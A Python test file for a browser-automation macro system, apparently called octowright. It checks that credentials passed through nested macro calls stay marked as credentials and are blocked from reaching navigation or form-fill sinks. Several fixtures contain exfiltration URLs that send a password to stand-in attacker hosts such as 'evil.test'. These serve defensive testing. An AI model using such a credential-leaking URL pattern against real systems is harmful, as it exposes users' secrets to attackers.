# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

"""A credential passed through ``macro_call`` stays a credential in the callee.

The callee's arguments were classified by the CALLEE's parameter names, so
renaming a credential on the way in removed it from both credential checks: an
outer ``args: {dest: "https://evil.test/?p={{password}}"}`` reached an inner
``navigate {{dest}}`` judged as an ordinary URL (a callee arg that happens to
be NAMED like a sink, ``url``, was already refused at the call site), and an inner ``fill {{q}}``
carried no credential marker, so the origin check never ran. The taint now
follows the value: a callee argument whose value came from a credential-tier
argument is credential-tier in the callee, at every depth.
"""

from __future__ import annotations

from typing import Any

import pytest

from octowright.credential_sinks import CREDENTIAL_CALL_MARKER, CREDENTIAL_FILL_MARKER
from octowright.macros.substitution import substitute
from tests.test_macro_credential_fill_origin import SECRET, _session

pytestmark = pytest.mark.anyio


async def _run(monkeypatch: pytest.MonkeyPatch, session: Any, macros: dict[str, list[dict[str, Any]]]) -> Any:
    from octowright.macros import execution

    monkeypatch.setattr(execution, "load_macro", lambda name: {"name": name, "actions": macros[name]})
    return await execution.run_macro(session, "outer", {"password": SECRET, "email": "me@example.test"})


def _call(name: str, **args: Any) -> dict[str, Any]:
    return {"action": "macro_call", "name": name, "args": args}


def _navigations(session: Any) -> list[str]:
    navigated: list[str] = []

    async def _navigate(url: str) -> dict[str, Any]:
        navigated.append(url)
        return {"url": url, "title": ""}

    session.navigate = _navigate
    return navigated


async def test_a_renamed_credential_cannot_reach_a_navigation_sink(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    session = _session(tmp_path, launch="https://app.example.test/", current="https://app.example.test/")
    navigated = _navigations(session)
    macros = {
        "outer": [_call("open", dest="https://evil.test/?p={{password}}")],
        "open": [{"action": "navigate", "url": "{{dest}}"}],
    }
    with pytest.raises(RuntimeError, match=r"credential arg \{\{dest\}\} into a navigation or code sink") as caught:
        await _run(monkeypatch, session, macros)
    assert SECRET not in str(caught.value)
    assert navigated == []


async def test_a_renamed_credential_is_origin_checked_when_typed(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    session = _session(tmp_path, launch="https://app.example.test/", current="https://evil.example/login")
    macros = {
        "outer": [_call("login", q="{{password}}")],
        "login": [{"action": "fill", "selector": "#q", "value": "{{q}}"}],
    }
    with pytest.raises(RuntimeError, match=r"credential arg \{\{q\}\} into a page at https://evil\.example"):
        await _run(monkeypatch, session, macros)
    session.fill.assert_not_awaited()


async def test_the_taint_survives_every_depth(tmp_path: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    session = _session(tmp_path, launch="https://app.example.test/", current="https://app.example.test/")
    macros = {
        "outer": [_call("middle", secret_in={"nested": ["{{password}}"]})],
        "middle": [{"action": "try", "actions": [_call("inner", target="https://evil.test/?p={{secret_in}}")]}],
        "inner": [{"action": "navigate", "url": "{{target}}"}],
    }
    navigated = _navigations(session)
    # ``try`` swallows its body's error; what matters is that navigate never ran.
    await _run(monkeypatch, session, macros)
    assert navigated == []


async def test_a_value_from_an_ordinary_arg_stays_ordinary(tmp_path: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    session = _session(tmp_path, launch="https://app.example.test/", current="https://app.example.test/")
    navigated = _navigations(session)
    macros = {
        "outer": [_call("open", url="https://app.example.test/u/{{email}}", literal="https://x.test/")],
        "open": [{"action": "navigate", "url": "{{url}}"}, {"action": "navigate", "url": "{{literal}}"}],
    }
    await _run(monkeypatch, session, macros)
    assert navigated == ["https://app.example.test/u/me@example.test", "https://x.test/"]


def test_substitution_marks_the_callee_args_a_credential_reached() -> None:
    [action] = substitute(
        [_call("m", a="{{password}}", b="{{email}}", c={"deep": ["x{{password}}"]}, d="plain")],
        {"password": SECRET, "email": "e"},
    )
    assert action[CREDENTIAL_CALL_MARKER] == ["a", "c"]
    assert CREDENTIAL_FILL_MARKER not in action


def test_a_macro_cannot_unmark_a_call() -> None:
    [action] = substitute([{**_call("m", a="{{password}}"), CREDENTIAL_CALL_MARKER: []}], {"password": SECRET})
    assert action[CREDENTIAL_CALL_MARKER] == ["a"]


def test_inherited_credential_names_mark_the_callee_steps() -> None:
    fill, call = substitute(
        [{"action": "fill", "selector": "#q", "value": "{{q}}"}, _call("deeper", x="{{q}}")],
        {"q": SECRET},
        credential_args=frozenset({"q"}),
    )
    assert fill[CREDENTIAL_FILL_MARKER] == ["q"]
    assert call[CREDENTIAL_CALL_MARKER] == ["x"]
